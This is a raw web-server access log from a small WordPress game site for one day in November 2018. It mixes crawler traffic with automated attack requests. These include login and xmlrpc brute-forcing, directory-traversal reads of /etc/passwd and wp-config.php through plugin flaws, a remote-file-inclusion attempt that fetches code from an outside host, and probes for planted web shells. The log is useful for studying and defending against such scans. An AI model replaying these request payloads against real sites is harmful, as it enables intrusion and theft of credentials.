95.108.181.61 - - [02/Nov/2018:14:25:39 +0000] "GET / HTTP/1.0" 200 59951 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
54.36.150.98 - - [02/Nov/2018:14:34:36 +0000] "GET /robots.txt HTTP/1.0" 404 208 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
54.36.148.243 - - [02/Nov/2018:14:34:36 +0000] "GET / HTTP/1.0" 200 59953 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
31.170.123.73 - - [02/Nov/2018:15:07:40 +0000] "POST /wp-cron.php?doing_wp_cron=1541171260.0430030822753906250000 HTTP/1.0" 200 - "http://xintanalegends.com/wp-cron.php?doing_wp_cron=1541171260.0430030822753906250000" "WordPress/4.9.8; http://xintanalegends.com"
185.119.81.11 - - [02/Nov/2018:15:07:39 +0000] "GET /wp-login.php HTTP/1.0" 200 2291 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.119.81.11 - - [02/Nov/2018:15:07:40 +0000] "POST /wp-login.php HTTP/1.0" 200 3239 "http://xintanalegends.com/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
2001:41d0:8:d1e0:: - - [02/Nov/2018:15:35:27 +0000] "GET /login.php?login=cmd HTTP/1.0" 404 207 "xintanalegends.com" "Mozilla/5.1 (Windows NT 6.0; WOW64) AppleWebKit/537.37 (KHTML, like Gecko) Chrome/58.0.1145.75 Safari/537.37"
195.154.118.41 - - [02/Nov/2018:15:41:36 +0000] "GET /wp-content/wp-object-cache.php?ver=123 HTTP/1.0" 404 228 "xintanalegends.com" "en.support.wordpress.com"
193.201.224.210 - - [02/Nov/2018:15:41:55 +0000] "GET /wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php HTTP/1.0" 404 266 "http://xintana.com/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
209.17.97.50 - - [02/Nov/2018:15:46:34 +0000] "GET / HTTP/1.0" 200 59953 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
31.170.123.73 - - [02/Nov/2018:15:46:35 +0000] "POST /wp-cron.php?doing_wp_cron=1541173595.0457460880279541015625 HTTP/1.0" 200 - "http://xintanalegends.com/wp-cron.php?doing_wp_cron=1541173595.0457460880279541015625" "WordPress/4.9.8; http://xintanalegends.com"
194.99.106.147 - - [02/Nov/2018:15:50:59 +0000] "GET /wp-login.php HTTP/1.0" 200 2291 "-" "Mozilla/5.0 (Windows; U; Windows NT 2.0) Gecko/20091201 Firefox/3.5.6 GTB5"
194.99.106.147 - - [02/Nov/2018:15:51:16 +0000] "GET /wp-login.php HTTP/1.0" 200 2291 "-" "Mozilla/5.0 (Windows; U; Windows NT 2.0) Gecko/20091201 Firefox/3.5.6 GTB5"
123.57.254.142 - - [02/Nov/2018:15:57:33 +0000] "POST /xmlrpc.php HTTP/1.0" 200 403 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; fr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8"
123.57.254.142 - - [02/Nov/2018:15:57:33 +0000] "POST /xmlrpc.php HTTP/1.0" 200 403 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; fr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8"
31.170.123.73 - - [02/Nov/2018:16:13:12 +0000] "POST /wp-cron.php?doing_wp_cron=1541175192.9857521057128906250000 HTTP/1.0" 200 - "http://xintanalegends.com/wp-cron.php?doing_wp_cron=1541175192.9857521057128906250000" "WordPress/4.9.8; http://xintanalegends.com"
185.117.118.153 - - [02/Nov/2018:16:13:12 +0000] "HEAD / HTTP/1.0" 200 - "-" "Mozilla/5.0 (compatible; Uptimebot/1.0; +http://www.uptime.com/uptimebot)"
178.148.222.29 - - [02/Nov/2018:16:14:36 +0000] "GET /wp-login.php HTTP/1.0" 200 2291 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
178.148.222.29 - - [02/Nov/2018:16:14:37 +0000] "GET / HTTP/1.0" 301 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
178.148.222.29 - - [02/Nov/2018:16:14:38 +0000] "GET / HTTP/1.0" 200 59951 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
178.148.222.29 - - [02/Nov/2018:16:15:02 +0000] "GET /wp-login.php HTTP/1.0" 200 2291 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
178.148.222.29 - - [02/Nov/2018:16:15:03 +0000] "GET / HTTP/1.0" 200 59951 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
31.170.123.73 - - [02/Nov/2018:17:22:44 +0000] "POST /wp-cron.php?doing_wp_cron=1541179364.2704861164093017578125 HTTP/1.0" 200 - "http://xintanalegends.com/wp-cron.php?doing_wp_cron=1541179364.2704861164093017578125" "WordPress/4.9.8; http://xintanalegends.com"
3.16.45.187 - - [02/Nov/2018:17:22:43 +0000] "GET /wp-login.php HTTP/1.0" 200 2291 "https://www.google.com/url?bfc0f2567f4815a61fdeeee7235946bf" "Mozilla/5.0 (Windows NT 6.2; rv:28.0) Gecko/20100101 Firefox/28.0"
3.16.45.187 - - [02/Nov/2018:17:22:46 +0000] "POST /wp-login.php HTTP/1.0" 200 3290 "https://www.google.com/url?bfc0f2567f4815a61fdeeee7235946bf" "Mozilla/5.0 (Windows NT 6.2; rv:28.0) Gecko/20100101 Firefox/28.0"
123.125.67.220 - - [02/Nov/2018:17:22:54 +0000] "GET /robots.txt HTTP/1.0" 404 208 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"
89.248.169.130 - - [02/Nov/2018:17:35:54 +0000] "POST /xmlrpc.php HTTP/1.0" 200 403 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; fr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8"
89.248.169.130 - - [02/Nov/2018:17:35:55 +0000] "POST /xmlrpc.php HTTP/1.0" 200 403 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; fr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8"
89.248.169.130 - - [02/Nov/2018:17:35:55 +0000] "POST /xmlrpc.php HTTP/1.0" 200 403 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; fr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8"
89.248.169.130 - - [02/Nov/2018:17:35:55 +0000] "POST /xmlrpc.php HTTP/1.0" 200 403 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; fr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8"
31.170.123.73 - - [02/Nov/2018:18:06:20 +0000] "POST /wp-cron.php?doing_wp_cron=1541181980.9011030197143554687500 HTTP/1.0" 200 - "http://xintanalegends.com/wp-cron.php?doing_wp_cron=1541181980.9011030197143554687500" "WordPress/4.9.8; http://xintanalegends.com"
18.223.30.190 - - [02/Nov/2018:18:06:20 +0000] "GET /wp-login.php HTTP/1.0" 200 2291 "https://www.google.com/url?643b51bb24d9057381ea7bbb069c88c5" "Mozilla/5.0 (Windows NT 6.2; rv:31.0) Gecko/20100101 Firefox/31.0"
18.223.30.190 - - [02/Nov/2018:18:06:38 +0000] "POST /wp-login.php HTTP/1.0" 200 3290 "https://www.google.com/url?643b51bb24d9057381ea7bbb069c88c5" "Mozilla/5.0 (Windows NT 6.2; rv:31.0) Gecko/20100101 Firefox/31.0"
147.135.4.74 - - [02/Nov/2018:18:17:04 +0000] "GET / HTTP/1.0" 200 59951 "-" "Scrapy/1.5.1 (+https://scrapy.org)"
180.76.15.136 - - [02/Nov/2018:18:18:03 +0000] "GET / HTTP/1.0" 200 59951 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
120.35.38.223 - - [02/Nov/2018:18:32:02 +0000] "HEAD /wp-content/themes/twentyseventeen/comments.php HTTP/1.0" 200 - "-" "-"
2001:41d0:8:d1e0:: - - [02/Nov/2018:18:52:50 +0000] "GET /wp-content/wp-object-cache.php?ver=123 HTTP/1.0" 404 228 "xintana.com" "en.support.wordpress.com"
54.36.149.90 - - [02/Nov/2018:19:12:38 +0000] "GET /wp-content/uploads/2015/08/xintana_animations_2.jpg HTTP/1.0" 200 208932 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
31.170.123.73 - - [02/Nov/2018:19:27:22 +0000] "POST /wp-cron.php?doing_wp_cron=1541186841.9307799339294433593750 HTTP/1.0" 200 - "http://xintanalegends.com/wp-cron.php?doing_wp_cron=1541186841.9307799339294433593750" "WordPress/4.9.8; http://xintanalegends.com"
185.86.13.213 - - [02/Nov/2018:19:27:21 +0000] "GET /wp-login.php HTTP/1.0" 200 2291 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.86.13.213 - - [02/Nov/2018:19:27:23 +0000] "POST /wp-login.php HTTP/1.0" 200 2559 "http://xintana.com/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.86.13.213 - - [02/Nov/2018:19:27:23 +0000] "POST /wp-login.php HTTP/1.0" 200 3239 "http://xintana.com/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
180.76.15.136 - - [02/Nov/2018:19:27:47 +0000] "GET / HTTP/1.0" 200 59953 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
45.32.79.177 - - [02/Nov/2018:19:43:02 +0000] "GET /robots.txt HTTP/1.0" 404 208 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:48.0) Gecko/20100101 Firefox/48.0"
45.32.79.177 - - [02/Nov/2018:19:43:02 +0000] "GET /xmlrpc.php?rsd HTTP/1.0" 200 856 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:48.0) Gecko/20100101 Firefox/48.0"
45.32.79.177 - - [02/Nov/2018:19:43:02 +0000] "GET /?author=1 HTTP/1.0" 200 85165 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:48.0) Gecko/20100101 Firefox/48.0"
45.32.79.177 - - [02/Nov/2018:19:43:04 +0000] "POST /xmlrpc.php HTTP/1.0" 200 85787 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:48.0) Gecko/20100101 Firefox/48.0"
45.32.79.177 - - [02/Nov/2018:19:43:05 +0000] "POST /xmlrpc.php HTTP/1.0" 200 85787 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:48.0) Gecko/20100101 Firefox/48.0"
45.32.79.177 - - [02/Nov/2018:19:43:06 +0000] "POST /xmlrpc.php HTTP/1.0" 200 85787 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:48.0) Gecko/20100101 Firefox/48.0"
45.32.79.177 - - [02/Nov/2018:19:43:07 +0000] "POST /xmlrpc.php HTTP/1.0" 200 85787 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:48.0) Gecko/20100101 Firefox/48.0"
45.32.79.177 - - [02/Nov/2018:19:43:08 +0000] "POST /xmlrpc.php HTTP/1.0" 200 85787 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:48.0) Gecko/20100101 Firefox/48.0"
45.32.79.177 - - [02/Nov/2018:19:43:09 +0000] "POST /xmlrpc.php HTTP/1.0" 200 85787 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:48.0) Gecko/20100101 Firefox/48.0"
45.32.79.177 - - [02/Nov/2018:19:43:10 +0000] "POST /xmlrpc.php HTTP/1.0" 200 85787 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:48.0) Gecko/20100101 Firefox/48.0"
185.86.164.103 - - [02/Nov/2018:19:44:57 +0000] "GET /wp-login.php HTTP/1.0" 200 2291 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.86.164.103 - - [02/Nov/2018:19:44:58 +0000] "POST /wp-login.php HTTP/1.0" 200 2559 "http://xintana.com/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.86.164.103 - - [02/Nov/2018:19:44:58 +0000] "POST /wp-login.php HTTP/1.0" 200 3239 "http://xintana.com/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
157.55.39.38 - - [02/Nov/2018:20:18:52 +0000] "GET /robots.txt HTTP/1.0" 404 208 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.140 - - [02/Nov/2018:20:18:54 +0000] "GET /wp-content/uploads/2018/02/Screenshot_Fight_02.jpg HTTP/1.0" 200 153589 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.140 - - [02/Nov/2018:21:01:10 +0000] "GET /wp-content/uploads/2018/02/Screenshot_Fight_02.jpg HTTP/1.0" 200 153589 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
199.127.196.148 - - [02/Nov/2018:21:19:41 +0000] "GET /wp-content/uploads/2015/08/doubleringstudios-logo.png HTTP/1.0" 200 213941 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
31.170.123.73 - - [02/Nov/2018:21:34:08 +0000] "POST /wp-cron.php?doing_wp_cron=1541194448.9022190570831298828125 HTTP/1.0" 200 - "http://xintanalegends.com/wp-cron.php?doing_wp_cron=1541194448.9022190570831298828125" "WordPress/4.9.8; http://xintanalegends.com"
185.85.190.132 - - [02/Nov/2018:21:34:08 +0000] "GET /wp-login.php HTTP/1.0" 200 2291 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.85.190.132 - - [02/Nov/2018:21:34:09 +0000] "POST /wp-login.php HTTP/1.0" 200 3239 "http://xintanalegends.com/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
54.39.185.73 - - [02/Nov/2018:22:04:13 +0000] "GET /robots.txt HTTP/1.0" 404 208 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
31.170.123.73 - - [02/Nov/2018:22:04:13 +0000] "POST /wp-cron.php?doing_wp_cron=1541196253.4853949546813964843750 HTTP/1.0" 200 - "http://xintanalegends.com/wp-cron.php?doing_wp_cron=1541196253.4853949546813964843750" "WordPress/4.9.8; http://xintanalegends.com"
54.39.185.73 - - [02/Nov/2018:22:04:13 +0000] "GET / HTTP/1.0" 200 59951 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
54.39.185.73 - - [02/Nov/2018:22:04:14 +0000] "GET /wp-content/plugins/simple-ads-manager/js/slider/tmpl.js HTTP/1.0" 404 253 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
54.39.185.73 - - [02/Nov/2018:22:04:14 +0000] "GET /wp-content/plugins/wp-mobile-detector/resize.php?src=http://www.relationshiptips.club/cache/db.php HTTP/1.0" 404 246 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
54.39.185.73 - - [02/Nov/2018:22:04:14 +0000] "GET /wp-content/plugins/wp-mobile-detector/cache/db.php HTTP/1.0" 404 248 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
54.39.185.73 - - [02/Nov/2018:22:04:14 +0000] "GET /wp-content/plugins/formcraft/file-upload/server/php/upload.php HTTP/1.0" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
54.39.185.73 - - [02/Nov/2018:22:04:15 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.0" 200 43 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
54.39.185.73 - - [02/Nov/2018:22:04:16 +0000] "GET /wp-content/plugins/revslider/temp/update_extract/revslider/db.php HTTP/1.0" 404 263 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
54.39.185.73 - - [02/Nov/2018:22:04:16 +0000] "GET /wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php HTTP/1.0" 500 15 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
54.39.185.73 - - [02/Nov/2018:22:04:16 +0000] "GET /wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php HTTP/1.0" 404 239 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
54.39.185.73 - - [02/Nov/2018:22:04:16 +0000] "GET /wp-content/plugins/recent-backups/download-file.php?file_link=/etc/passwd HTTP/1.0" 404 249 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
54.39.185.73 - - [02/Nov/2018:22:04:17 +0000] "GET /wp-content/plugins/wptf-image-gallery/lib-mbox/ajax_load.php?url=/etc/passwd HTTP/1.0" 404 258 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
54.39.185.73 - - [02/Nov/2018:22:04:17 +0000] "GET /wp-content/plugins/./simple-image-manipulator/controller/download.php?filepath=/etc/passwd HTTP/1.0" 404 265 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
54.39.185.73 - - [02/Nov/2018:22:04:17 +0000] "GET /wp-content/plugins/candidate-application-form/downloadpdffile.php?fileName=../../../../../../../../../../etc/passwd HTTP/1.0" 404 263 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
54.39.185.73 - - [02/Nov/2018:22:04:17 +0000] "GET /wp-content/plugins/wp-ecommerce-shop-styling/includes/download.php?filename=../../../../../../../../../etc/passwd HTTP/1.0" 404 264 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
54.39.185.73 - - [02/Nov/2018:22:04:18 +0000] "POST /wp-content/plugins/wp-symposium/server/php/index.php HTTP/1.0" 404 250 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
54.39.185.73 - - [02/Nov/2018:22:04:18 +0000] "GET /wp-content/plugins/wp-symposium/server/php/BGqobheCyCkPhA.php HTTP/1.0" 404 259 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
54.39.185.73 - - [02/Nov/2018:22:04:18 +0000] "POST / HTTP/1.0" 200 59951 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
54.39.185.73 - - [02/Nov/2018:22:04:19 +0000] "POST / HTTP/1.0" 200 59951 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
185.56.80.242 - - [02/Nov/2018:22:06:13 +0000] "GET /fonts/wp-caches.php HTTP/1.0" 404 217 "-" "Mozilla/5.0 (Linux; Android 4.1.2; SGH-I727R Build/JZO54K) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.169 Mobile Safari/537.22"
205.185.113.14 - - [02/Nov/2018:22:06:15 +0000] "GET /farious/popup-pomo.php HTTP/1.0" 404 220 "-" "Mozilla/5.0 (Linux; Android 4.1.2; SGH-I727R Build/JZO54K) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.169 Mobile Safari/537.22"
205.185.113.14 - - [02/Nov/2018:22:06:17 +0000] "GET /wp-content/plugins/corner-ad/post.php?set=1q1 HTTP/1.0" 404 235 "-" "Mozilla/5.0 (Linux; Android 4.1.2; SGH-I727R Build/JZO54K) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.169 Mobile Safari/537.22"
205.185.113.14 - - [02/Nov/2018:22:06:19 +0000] "GET /mybeafter.php HTTP/1.0" 404 211 "-" "Mozilla/5.0 (Linux; Android 4.1.2; SGH-I727R Build/JZO54K) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.169 Mobile Safari/537.22"
205.185.113.14 - - [02/Nov/2018:22:06:21 +0000] "GET /wp-content/plugins/fast-plugins/asct.php HTTP/1.0" 404 238 "-" "Mozilla/5.0 (Linux; Android 4.1.2; SGH-I727R Build/JZO54K) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.169 Mobile Safari/537.22"
205.185.113.14 - - [02/Nov/2018:22:06:23 +0000] "GET /bb.php HTTP/1.0" 404 204 "-" "Mozilla/5.0 (Linux; Android 4.1.2; SGH-I727R Build/JZO54K) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.169 Mobile Safari/537.22"
205.185.113.14 - - [02/Nov/2018:22:06:25 +0000] "GET /wp-content/wp-content.php HTTP/1.0" 404 223 "-" "Mozilla/5.0 (Linux; Android 4.1.2; SGH-I727R Build/JZO54K) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.169 Mobile Safari/537.22"
205.185.113.14 - - [02/Nov/2018:22:06:27 +0000] "GET /s_s.php HTTP/1.0" 404 205 "-" "Mozilla/5.0 (Linux; Android 4.1.2; SGH-I727R Build/JZO54K) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.169 Mobile Safari/537.22"
205.185.113.14 - - [02/Nov/2018:22:06:29 +0000] "GET /new_license.php HTTP/1.0" 404 213 "-" "Mozilla/5.0 (Linux; Android 4.1.2; SGH-I727R Build/JZO54K) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.169 Mobile Safari/537.22"
205.185.113.14 - - [02/Nov/2018:22:06:31 +0000] "GET /xNOVAx.php HTTP/1.0" 404 208 "-" "Mozilla/5.0 (Linux; Android 4.1.2; SGH-I727R Build/JZO54K) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.169 Mobile Safari/537.22"
205.185.113.14 - - [02/Nov/2018:22:06:33 +0000] "GET /css_.php HTTP/1.0" 404 206 "-" "Mozilla/5.0 (Linux; Android 4.1.2; SGH-I727R Build/JZO54K) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.169 Mobile Safari/537.22"
205.185.113.14 - - [02/Nov/2018:22:06:35 +0000] "GET /oldvip.php HTTP/1.0" 404 208 "-" "Mozilla/5.0 (Linux; Android 4.1.2; SGH-I727R Build/JZO54K) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.169 Mobile Safari/537.22"
205.185.113.14 - - [02/Nov/2018:22:06:37 +0000] "GET /theme.php HTTP/1.0" 404 207 "-" "Mozilla/5.0 (Linux; Android 4.1.2; SGH-I727R Build/JZO54K) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.169 Mobile Safari/537.22"
205.185.113.14 - - [02/Nov/2018:22:06:39 +0000] "GET /x3x.php HTTP/1.0" 404 205 "-" "Mozilla/5.0 (Linux; Android 4.1.2; SGH-I727R Build/JZO54K) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.169 Mobile Safari/537.22"
205.185.113.14 - - [02/Nov/2018:22:06:41 +0000] "GET /wdb.php HTTP/1.0" 404 205 "-" "Mozilla/5.0 (Linux; Android 4.1.2; SGH-I727R Build/JZO54K) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.169 Mobile Safari/537.22"
205.185.113.14 - - [02/Nov/2018:22:06:43 +0000] "GET /XAttacker.php?X=Attacker HTTP/1.0" 404 211 "-" "Mozilla/5.0 (Linux; Android 4.1.2; SGH-I727R Build/JZO54K) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.169 Mobile Safari/537.22"
205.185.113.14 - - [02/Nov/2018:22:06:45 +0000] "GET /wp-content/plugins/seo-site-admin/config.php HTTP/1.0" 404 242 "-" "Mozilla/5.0 (Linux; Android 4.1.2; SGH-I727R Build/JZO54K) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.169 Mobile Safari/537.22"
205.185.113.14 - - [02/Nov/2018:22:06:47 +0000] "GET /z_auth.php HTTP/1.0" 404 208 "-" "Mozilla/5.0 (Linux; Android 4.1.2; SGH-I727R Build/JZO54K) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.169 Mobile Safari/537.22"
45.32.79.177 - - [02/Nov/2018:22:25:35 +0000] "GET /robots.txt HTTP/1.0" 404 208 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
45.32.79.177 - - [02/Nov/2018:22:25:35 +0000] "GET / HTTP/1.0" 200 59951 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
45.32.79.177 - - [02/Nov/2018:22:25:36 +0000] "GET /wp-content/plugins/simple-ads-manager/js/slider/tmpl.js HTTP/1.0" 404 253 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
45.32.79.177 - - [02/Nov/2018:22:25:36 +0000] "GET /wp-content/plugins/wp-mobile-detector/resize.php?src=http://www.relationshiptips.club/cache/db.php HTTP/1.0" 404 246 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
45.32.79.177 - - [02/Nov/2018:22:25:36 +0000] "GET /wp-content/plugins/wp-mobile-detector/cache/db.php HTTP/1.0" 404 248 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
45.32.79.177 - - [02/Nov/2018:22:25:36 +0000] "GET /wp-content/plugins/formcraft/file-upload/server/php/upload.php HTTP/1.0" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
45.32.79.177 - - [02/Nov/2018:22:25:37 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.0" 200 43 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
